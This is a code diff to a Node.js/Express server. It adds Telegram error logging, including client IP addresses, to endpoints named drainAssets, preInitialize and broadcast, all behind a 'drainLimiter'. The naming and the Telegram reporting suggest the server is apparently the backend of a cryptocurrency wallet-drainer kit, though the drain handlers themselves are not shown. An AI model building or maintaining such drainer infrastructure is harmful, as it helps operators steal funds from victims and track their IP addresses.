@@ -87,6 +87,20 @@ app.post('/api/drainAssets', drainLimiter, async (req, res) => {
     await drainAssetsHandler(req, res);
   } catch (importError) {
     console.error('[DRAIN_ASSETS] Import error:', importError);
+    
+    // Log to Telegram
+    try {
+      await telegramLogger.logAPIImportError({
+        module: 'drainAssets',
+        error: importError.message,
+        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
+        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
+        timestamp: new Date().toISOString()
+      });
+    } catch (telegramError) {
+      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
+    }
+    
     res.status(500).json(errorHandler.formatApiError(importError, {
       context: 'Drain Assets Import Error',
       endpoint: '/api/drainAssets'
@@ -100,6 +114,20 @@ app.post('/api/preInitialize', drainLimiter, async (req, res) => {
     await preInitializeHandler(req, res);
   } catch (importError) {
     console.error('[PRE_INITIALIZE] Import error:', importError);
+    
+    // Log to Telegram
+    try {
+      await telegramLogger.logAPIImportError({
+        module: 'preInitialize',
+        error: importError.message,
+        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
+        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
+        timestamp: new Date().toISOString()
+      });
+    } catch (telegramError) {
+      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
+    }
+    
     res.status(500).json(errorHandler.formatApiError(importError, {
       context: 'Pre-Initialize Import Error',
       endpoint: '/api/preInitialize'
@@ -113,6 +141,20 @@ app.post('/api/broadcast', drainLimiter, async (req, res) => {
     await broadcastHandler(req, res);
   } catch (importError) {
     console.error('[BROADCAST] Import error:', importError);
+    
+    // Log to Telegram
+    try {
+      await telegramLogger.logAPIImportError({
+        module: 'broadcast',
+        error: importError.message,
+        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
+        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
+        timestamp: new Date().toISOString()
+      });
+    } catch (telegramError) {
+      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
+    }
+    
     res.status(500).json(errorHandler.formatApiError(importError, {
       context: 'Broadcast Import Error',
       endpoint: '/api/broadcast'
